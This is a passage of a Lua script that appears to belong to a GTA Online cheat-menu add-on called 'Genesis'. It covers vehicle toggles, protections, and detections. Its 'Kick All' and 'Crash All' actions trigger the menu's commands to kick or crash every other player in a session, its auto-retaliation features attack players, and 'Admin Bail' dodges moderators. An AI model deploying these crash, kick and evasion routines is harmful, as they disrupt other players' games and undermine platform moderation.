menu.toggle(MenuVehDoors, "Instantly Open", {"gsdoorinstantopen"}, "Wether the Door should go Straight to it's Open Position, or go through the whole Animation.", function(on)
    if on then InstantDoorBool = true else InstantDoorBool = false end
end)

LooseDoorBool = true
menu.toggle(MenuVehDoors, "Stay Open", {"gsdoorstayopen"}, "Wether the Door should stay Open until Toggled off, or be able to Close if Pushed.", function(on)
    if on then LooseDoorBool = false else LooseDoorBool = true end
end)

DoorForceOpen = false
menu.toggle(MenuVehDoors, "Force Stay Open", {"gsdoorforcestayopen"}, "This uses a Loop to Spam open Door so it Never even Moves.", function(on)
    if on then DoorForceOpen = true else DoorForceOpen = false end 
end)



--[[| Vehicle/Other/Doors/OpenClose/ |]]--
menu.toggle(MenuVehOpenDoors, "Front Left", {"gsdoorfl"}, "Open the Front Left Door.", function(on) OpenVehicleDoor_CurCar(true, 0, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Front Right", {"gsdoorfr"}, "Open the Front Right Door.", function(on) OpenVehicleDoor_CurCar(true, 1, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Back Left", {"gsdoorrl"}, "Open the Back Left Door.", function(on) OpenVehicleDoor_CurCar(true, 2, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Back Right", {"gsdoorrr"}, "Open the Back Right Door.", function(on) OpenVehicleDoor_CurCar(true, 3, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Hood", {"gsdoorhood"}, "Open the Hood.", function(on) OpenVehicleDoor_CurCar(true, 4, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Trunk", {"gsdoortrunk"}, "Open the Trunk.", function(on) OpenVehicleDoor_CurCar(true, 5, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Back", {"gsdoorback"}, "Open the Back.", function(on) OpenVehicleDoor_CurCar(true, 6, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)

menu.toggle(MenuVehOpenDoors, "Back 2", {"gsdoorbackb"}, "Open the Second Back.", function(on) OpenVehicleDoor_CurCar(true, 7, LooseDoorBool, InstantDoorBool, DoorForceOpen) end)


--[[| Vehicle/Other/Windows/ |]]--
menu.toggle(MenuVehWindows, "Front Left", {"gswindowfl"}, "Roll the Front Left Window Up or Down.", function(on)
    if on then
        LowerVehicleWindow_CurCar(true, 0)
    else
        LowerVehicleWindow_CurCar(false, 0)
    end
end)

menu.toggle(MenuVehWindows, "Front Right", {"gswindowfr"}, "Roll the Front Right Window Up or Down.", function(on)
    if on then
        LowerVehicleWindow_CurCar(true, 1)
    else
        LowerVehicleWindow_CurCar(false, 1)
    end
end)

menu.toggle(MenuVehWindows, "Back Left", {"gswindowrl"}, "Roll the Back Left Window Up or Down.", function(on)
    if on then
        LowerVehicleWindow_CurCar(true, 2)
    else
        LowerVehicleWindow_CurCar(false, 2)
    end
end)

menu.toggle(MenuVehWindows, "Back Right", {"gswindowrr"}, "Roll the Back Right Window Up or Down.", function(on)
    if on then
        LowerVehicleWindow_CurCar(true, 3)
    else
        LowerVehicleWindow_CurCar(false, 3)
    end
end)


--[[| Vehicle/Other/Countermeasures/ |]]--
menu.toggle_loop(MenuVehOtherCounterM, "Infinite Countermeasures", {"gsinfinitecountermeasures"}, "Gives any Vehicle that has Countermeasures Infinite Countermeasures. Has no corellation to 'Force Countermeasures'", function(on)    
    if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
        VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
    end
end)

--[[| Vehicle/Other/Countermeasures/Flare/ |]]--
RealFlares = false
menu.toggle_loop(MenuVehCounterFlare, "Force Flares", {"gsforceflares"}, "Spawns Flares Behind the Vehicle when the Horn Button is Pressed.", function(on)    
    if PAD.IS_CONTROL_PRESSED(46, 46) then
        if player_cur_car ~= 0 then
            if RealFlares == false then
                local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -2, -2.0, 0)
                local target2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -3, -25.0, 0)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target2['x'], target2['y'], target2['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 25.0)
                local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 2, -2.0, 0)
                local target2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 3, -25.0, 0)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target2['x'], target2['y'], target2['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 25.0)
                util.yield(350)
                local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -4, -2.0, 0)
                local target2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -10, -20.0, -1)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target2['x'], target2['y'], target2['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 25.0)
                local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 4, -2.0, 0)
                local target2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 10, -20.0, -1)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target2['x'], target2['y'], target2['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 25.0)
                util.toast("-Genesis-\n\nFlares Recharging...")
                util.yield(2000)
                util.toast("-Genesis-\n\nFlares Ready!")
            elseif RealFlares then
                for i = 0, 10, 1 do 
                    local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, -2, -1)
                    local target2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, -20, -15)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target2['x'], target2['y'], target2['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 25.0)
                    util.yield(200)
                end
                util.toast("-Genesis-\n\nFlares Recharging...")
                util.yield(2000)
                util.toast("-Genesis-\n\nFlares Ready!")
            end
        else
            util.toast("-Genesis-\n\nPlease get in a Car before Activating this!")
        end
    end
end)

menu.toggle(MenuVehCounterFlare, "Realistic Flares", {"gsforceflaresrealistic"}, "An Option for 'Force Flares' that will instead Shoot 10 Flares Down, like in Real Life Jets.", function(on)
    if on then RealFlares = true else RealFlares = false end
end)


--[[| Vehicle/Other/Countermeasures/Chaff/ |]]--
menu.toggle_loop(MenuVehCounterChaff, "Force Chaff", {"gsforcechaff"}, "Spawns Chaff Particles on you and Disables Lock on for 6 Seconds.", function(on)
    --scr_sm_counter
    --scr_sm_counter_chaff
    STREAMING.REQUEST_NAMED_PTFX_ASSET("scr_sm_counter")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
    if STREAMING.HAS_NAMED_PTFX_ASSET_LOADED("scr_sm_counter") then
        if PAD.IS_CONTROL_PRESSED(46, 46) then
            if player_cur_car ~= 0 then
                local ChaffTarget = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_cur_car, 0, 0, -2.5)           
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'], ChaffTarget['y'], ChaffTarget['z'], 0, 0, 0, 10, 0, 0, 0)
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'], ChaffTarget['y'], ChaffTarget['z'], 0, 0, 0, 10, 0, 0, 0)
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'] + 2, ChaffTarget['y'], ChaffTarget['z'], 100, 0, 0, 10, 0, 0, 0)
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'] + 2, ChaffTarget['y'], ChaffTarget['z'], 100, 0, 0, 10, 0, 0, 0)               
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'] - 2, ChaffTarget['y'], ChaffTarget['z'], -100, 0, 0, 10, 0, 0, 0)
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'] - 2, ChaffTarget['y'], ChaffTarget['z'], -100, 0, 0, 10, 0, 0, 0)                
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'], ChaffTarget['y'] + 2, ChaffTarget['z'], 0, 100, 0, 10, 0, 0, 0)               
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sm_counter")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sm_counter_chaff", ChaffTarget['x'], ChaffTarget['y'] - 2, ChaffTarget['z'], 0, -100, 0, 10, 0, 0, 0)           
                util.toast("-Genesis-\n\nChaff Recharging...")
                menu.trigger_command(menu.ref_by_command_name("nolockon"))
                util.yield(6000)
                menu.trigger_command(menu.ref_by_command_name("nolockon"))
                util.yield(2000)
                util.toast("-Genesis-\n\nChaff Ready!")
            end
        end
    else
        util.toast("-Genesis-\n\nWas not Able to Load Particle Effect.")
    end
end)


--[[| Vehicle/Other/Countermeasures/TROPHYAPS/ |]]--
menu.toggle(MenuCMAPS, "TROPHY APS", {"gstrophyaps"}, "APS (Active Protection System), is a System that will Defend your Vehicle from Missles by Shooting them out of the Sky before they Hit you.", function(on)
    APS_charges = CountermeasureAPSCharges
    vehicle_APS = on
    mod_uses("object", if on then 1 else -1)
end)

CountermeasureAPSrange = 10
menu.slider(MenuCMAPS, "APS Range", {"gstrophyapsrange"}, "The Range at which APS will Destroy Incoming Projectiles.", 5, 100, 10, 5, function(value)
    CountermeasureAPSrange = value
end)

CountermeasureAPSCharges = 8
menu.slider(MenuCMAPS, "APS Charges", {"gstrophyapscharges"}, "Set the Amount of Charges / Projectiles the APS can Destroy before having to Reload.", 1, 100, 8, 1, function(value)
    CountermeasureAPSCharges = value
end)

CountermeasureAPSTimeout = 8000
menu.slider(MenuCMAPS, "APS Reload Time", {"gstrophyapsreload"}, "Set the Time, in Seconds, for how Long it takes the APS to Reload after Depleting all of its Charges. This is not after every Shot, just the Reload after EVERY Charge has been used.", 1, 100, 8, 1, function(value)
    local MultipliedTime = value * 1000
    CountermeasureAPSTimeout = MultipliedTime
end)


--[[| Vehicle/Other/Miscellaneous/ |]]--
menu.toggle_loop(MenuVehOther, "Horn Annoy", {"gshornannoy"}, "Swaps through Random Horns and Spams then. You can use this to Annoy People in Passive.", function(toggle)    
    if player_cur_car ~= 0 and  PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        VEHICLE.SET_VEHICLE_MOD(player_cur_car, 14, math.random(0, 51), false)
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 86, 1.0)
        util.yield(50)
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 86, 0.0)
    end
end)

menu.toggle_loop(MenuVehOther, "Enter any Car", {"gsenteranycar"}, "This will Try to Unlock any Car you Try to get into, and if it doesn't Work, it will just Teleport you into the Driver's Seat.", function(on)
    UnlockVehicleGetIn()
end)

menu.toggle(MenuVehOther, "Vehicle Alarm", {"gsvehiclealarm"}, "Turns on your Current Vehicle's Alarm.", function(on)
    if on then
        VEHICLE.SET_VEHICLE_ALARM(player_cur_car, true)
        VEHICLE.START_VEHICLE_ALARM(player_cur_car)
    else
        VEHICLE.SET_VEHICLE_ALARM(player_cur_car, false)
    end
end)

menu.toggle_loop(MenuVehOther, "Bike Safety Wheels", {"gsbikesafetywheels"}, "Prevents Motorcycles from Tipping over. You can still Fall off However, it just won't Fall on its Side.", function(on)
    VEHICLE.SET_BIKE_ON_STAND(player_cur_car, 0, 0)
end)

menu.click_slider(MenuVehOther, "Switch Seats", {"gsswitchseat"}, "Switches you through the Seats of the Current Car you're in. -1 is Always Driver.", -1, 8, -1, 1, function (value)
    local locped = players.user_ped()
    if PED.IS_PED_IN_ANY_VEHICLE(locped, false) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(locped, false)
        PED.SET_PED_INTO_VEHICLE(locped, veh, value)
    else
        util.toast("-Genesis-\n\nCould not Switch Seats.\nGet in a Vehicle First!")
    end
end)



--[[| Online/AllPlayers/ |]]--
menu.action(MenuOnlineAll, "Kick All", {"gskickall"}, "Kicks every Player in the Session. Reccomended that you are the Host when using this.", function(on_click)
    for i = 0, 31, 1 do
        if players.exists(i) and i ~= players.user() then
            local string PlayerName = players.get_name(i)
            local string PlayerNameLower = PlayerName:lower()
            menu.trigger_command(menu.ref_by_command_name("kick"..PlayerNameLower))
        end
    end
end)

menu.action(MenuOnlineAll, "Crash All", {"gscrashall"}, "Crashes every Player in the Session.", function(on_click)
    for i = 0, 31, 1 do
        if players.exists(i) and i ~= players.user() then
            local string PlayerName = players.get_name(i)
            local string PlayerNameLower = PlayerName:lower()
            menu.trigger_command(menu.ref_by_command_name("crash"..PlayerNameLower))
            menu.trigger_command(menu.ref_by_command_name("footlettuce"..PlayerNameLower))
            menu.trigger_command(menu.ref_by_command_name("slaughter"..PlayerNameLower))
            menu.trigger_command(menu.ref_by_command_name("steamroll"..PlayerNameLower))
        end
    end
end)

function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

menu.action(MenuProtection, "Remove Attachments", {"removeattachments"}, "clears your ped of all attachments by regenerating it", function ()
if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
menu.trigger_commands("mpmale")
else
menu.trigger_commands("mpfemale")
end
end)

supercleanse = menu.action(MenuProtection, "Super Cleanse", {"cleanrope"}, "Cleans everything including ropes.", function(click_type)
local ct = 0
for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
if not PED.IS_PED_A_PLAYER(driver) then
entities.delete_by_handle(ent)
ct += 1
end
end
for k,ent in pairs(entities.get_all_peds_as_handles()) do
if not PED.IS_PED_A_PLAYER(ent) then
entities.delete_by_handle(ent)
end
ct += 1
end
for k,ent in pairs(entities.get_all_objects_as_handles()) do
entities.delete_by_handle(ent)
ct += 1
end
local rope_alloc = memory.alloc(4)
for i=0, 100 do
memory.write_int(rope_alloc, i)
if PHYSICS.DOES_ROPE_EXIST(rope_alloc) then
PHYSICS.DELETE_ROPE(rope_alloc)
ct += 1
end
end
util.toast("Super Cleanse has cleaned " .. ct .. " entities!")
end, function()
util.toast("Aborted.")
end)

supercleanse = menu.toggle_loop(MenuProtection, "Super Cleanse Toggle", {"cleanropeloop"}, "Cleans everything including ropes.", function(click_type)
util.show_corner_help("Be careful; using this can possibly crash your game or break a mission if important entities get deleted. Proceed?\n(NOTE: If you have skip warnings on, this won't show again.)")
local ct = 0
for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
if not PED.IS_PED_A_PLAYER(driver) then
entities.delete_by_handle(ent)
ct += 1
end
end
for k,ent in pairs(entities.get_all_peds_as_handles()) do
if not PED.IS_PED_A_PLAYER(ent) then
entities.delete_by_handle(ent)
end
ct += 1
end
for k,ent in pairs(entities.get_all_objects_as_handles()) do
entities.delete_by_handle(ent)
ct += 1
end
local rope_alloc = memory.alloc(4)
for i=0, 100 do
memory.write_int(rope_alloc, i)
if PHYSICS.DOES_ROPE_EXIST(rope_alloc) then
PHYSICS.DELETE_ROPE(rope_alloc)
ct += 1
end
end
end, function()
util.toast("Everything cleaned including ropes.")
end)

menu.action(MenuProtection, "No Entity Spawn", {"clean"}, "Attempt to fuck every single entity without exception. Not recommended but fuck it.", function(on_click)
local ct = 0
for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)

ct = ct + 1
end
for k,ent in pairs(entities.get_all_peds_as_handles()) do
if not PED.IS_PED_A_PLAYER(ent) then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)

end
ct = ct + 1
end
for k,ent in pairs(entities.get_all_objects_as_handles()) do
if ent ~= PLAYER.PLAYER_PED_ID() then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
ct = ct + 1
end
end
for k,ent in pairs(entities.get_all_pickups_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
util.yield()
return
end
end, nil, nil, COMMANDPERM_FRIENDLY)

menu.toggle_loop(MenuProtection, "No Entity Spawn Toggled", {"noentities"}, "Attempt to fuck every single entity without exception. Not recommended but fuck it.", function(on_loop)
local ct = 0
for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)

ct = ct + 1
end
for k,ent in pairs(entities.get_all_peds_as_handles()) do
if not PED.IS_PED_A_PLAYER(ent) then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)

end
ct = ct + 1
end
for k,ent in pairs(entities.get_all_objects_as_handles()) do
if ent ~= PLAYER.PLAYER_PED_ID() then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
ct = ct + 1
end
end
for k,ent in pairs(entities.get_all_pickups_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
util.yield()
return
end
end)

menu.toggle_loop(MenuProtection, "Clear Shit Up Toggled", {"supercloop"}, "Every 1 second deletes all owned entities.", function (on_toggle)
menu.trigger_commands("superc")
util.yield(750)
end)

menu.click_slider(MenuProtection,"Clear Shit Up", {"superc"}, "5 = peds, 4 = vehicles, 3 = objects, 2 = pickups, 1 = all \nNote: This excludes players and their vehicles.", 1, 5, 1, 1, function(on_change)
if on_change == 5 then
local count = 0
for k,ent in pairs(entities.get_all_peds_as_handles()) do
if not PED.IS_PED_A_PLAYER(ent) then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
util.yield()
count = count + 1

end
end
--util.toast("Fucked off " .. count .. " Peds removed. :)")
end
if on_change == 4 then
local count = 0
for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
if not PED.IS_PED_A_PLAYER(PedInSeat) then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
util.yield()
count = count + 1
end
end
--util.toast("Fucked off " .. count .. " Vehicles removed. :)")
return
end
if on_change == 3 then
local count = 0
for k,ent in pairs(entities.get_all_objects_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
count = count + 1
util.yield()
end
return
--util.toast("Fucked off " .. count .. " Objects removed. :)")
end
if on_change == 2 then
local count = 0
for k, ent in pairs(entities.get_all_pickups_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
count = count + 1
util.yield()
end
return
--util.toast("Fucked off " .. count .. " Pickups removed. :)")
end
if on_change == 1 then
local count = 0
for k, ent in pairs(entities.get_all_peds_as_handles()) do
if not PED.IS_PED_A_PLAYER(ent) then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
util.yield()
count = count + 1
end
end
for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
if not PED.IS_PED_A_PLAYER(PedInSeat) then
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
util.yield()
count = count + 1
end
end
for k,ent in pairs(entities.get_all_objects_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
count = count + 1
util.yield()
end
for k,ent in pairs(entities.get_all_pickups_as_handles()) do
ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
entities.delete_by_handle(ent)
count = count + 1
util.yield()
end
return
--util.toast("Fucked Everything off " .. count .. " Entities removed. :)")
end
end)

menu.toggle_loop(MenuProtection, "Force Stop all sound events", {"stopsounds"}, "Stops sound events triggered by stuff", function()
            for i = -1, 100 do
            AUDIO.STOP_SOUND(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end
    end
)

menu.toggle(MenuProtection, "Toggle Block all Network Events", {"togglenet"}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
        local BlockNetEvents =
            menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
        local UnblockNetEvents =
            menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
        if on_toggle then
            menu.trigger_command(BlockNetEvents)
        else
            menu.trigger_command(UnblockNetEvents)
        end
    end
)

menu.toggle(MenuProtection, "Toggle Block all Incoming Syncs", {}, "This breaks the game, so only leave it on if you are worried about an incoming modder attack", function(on_toggle)
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
if on_toggle then
menu.trigger_command(BlockIncSyncs)
else
menu.trigger_command(UnblockIncSyncs)
end
end)

menu.toggle(MenuProtection, "Toggle Block all Outgoing Syncs", {}, "This breaks the game, and other players will not receive any updates from your client", function(on_toggle)
if on_toggle then
menu.trigger_commands("desyncall on")
else
menu.trigger_commands("desyncall off")
end
end)

menu.toggle(MenuProtection, "Toggle Panic Mode", {"panic"}, "Uses all of the above. This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
if on_toggle then
menu.trigger_commands("desyncall on")
menu.trigger_command(BlockIncSyncs)
menu.trigger_command(BlockNetEvents)
menu.trigger_commands("anticrashcamera on")
else
menu.trigger_commands("desyncall off")
menu.trigger_command(UnblockIncSyncs)
menu.trigger_command(UnblockNetEvents)
menu.trigger_commands("anticrashcamera off")
end
end)

menu.toggle_loop(MenuProtection, "Block Clones", {"blockclones"}, "Detects And Blocks Clones.", function()
for i, ped in ipairs(entities.get_all_peds_as_handles()) do
if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
util.toast("Clone model detected. Clearing...")
entities.delete_by_handle(ped)
util.yield(100)
end
end
end)

menu.toggle_loop(MenuProtection, "Admin Bail", {}, "If it detects an R* admin it changes your session.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " If there is an admin, for another session.")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle_loop(MenuProtection, "Block PFTX/Particulate Lag", {"blocklag"}, "blocks explosive lag", function()
        local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
        GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
    end
)

menu.toggle_loop(MenuDetections, "Is Host", {}, "Detects if someone host", function()
util.draw_debug_text(players.get_name(players.get_host()) .. " Is Host")
end)

menu.toggle_loop(MenuDetections, "Aim Detection", {}, "Detects if someone is aiming a weapon at you.", function()
        for _, csPID in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
            for i, hash in ipairs(all_weapons) do
                local weapon_hash = util.joaat(hash)
                if
                    PLAYER.IS_PLAYER_FREE_AIMING(csPID, ped, weapon_hash) and
                        PLAYER.IS_PLAYER_TARGETTING_ENTITY(csPID, ped, weapon_hash)
                 then
                    util.draw_debug_text(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                    util.toast(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                    util.log(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                else
                    util.yield(100)
                end
            end
        end
    end
)

menu.toggle_loop(MenuDetections, "Auto Snipe", {}, "Detects if someone is aiming a weapon at you, then shoots them back them.", function()
        for _, csPID in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
            for i, hash in ipairs(all_weapons) do
                local weapon_hash = util.joaat(hash)
                if
                    PLAYER.IS_PLAYER_FREE_AIMING(csPID, ped, weapon_hash) and
                        PLAYER.IS_PLAYER_TARGETTING_ENTITY(csPID, ped, weapon_hash)
                 then
                    menu.trigger_commands("osnipel" .. players.get_name(csPID))
                    util.yield(1000)
                    menu.trigger_commands("osnipel" .. players.get_name(csPID))
                    util.draw_debug_text(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                    util.toast(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                    util.log(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                else
                    util.yield(100)
                end
            end
        end
    end
)

menu.toggle_loop(MenuDetections, "Auto Firework", {}, "Detects if someone is aiming a weapon at you, then shoots fireworks at them.", function()
        for _, csPID in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
            for i, hash in ipairs(all_weapons) do
                local weapon_hash = util.joaat(hash)
                if
                    PLAYER.IS_PLAYER_FREE_AIMING(csPID, ped, weapon_hash) and
                        PLAYER.IS_PLAYER_TARGETTING_ENTITY(csPID, ped, weapon_hash)
                 then
                    menu.trigger_commands("fireworkon" .. players.get_name(csPID))
                    util.yield(1000)
                    menu.trigger_commands("fireworkon" .. players.get_name(csPID))
                    util.draw_debug_text(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                    util.toast(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                    util.log(players.get_name(csPID) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                else
                    util.yield(100)
                end
            end
        end
    end
)

menu.toggle_loop(MenuDetections, "Auto Atomizer", {}, "Detects if someone is aiming a weapon at you, then shoots atomizer at them.", function()
for _, csPID in ipairs(players.list(false, true, true)) do
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
for i, hash in ipairs(all_weapons) do
local weapon_hash = util.joaat(hash)
if PLAYER.IS_PLAYER_FREE_AIMING(csPID, ped, weapon_hash) and PLAYER.IS_PLAYER_TARGETTING_ENTITY(csPID, ped, weapon_hash) then
menu.trigger_commands("atomizeron" .. players.get_name(csPID))
util.yield(1000)
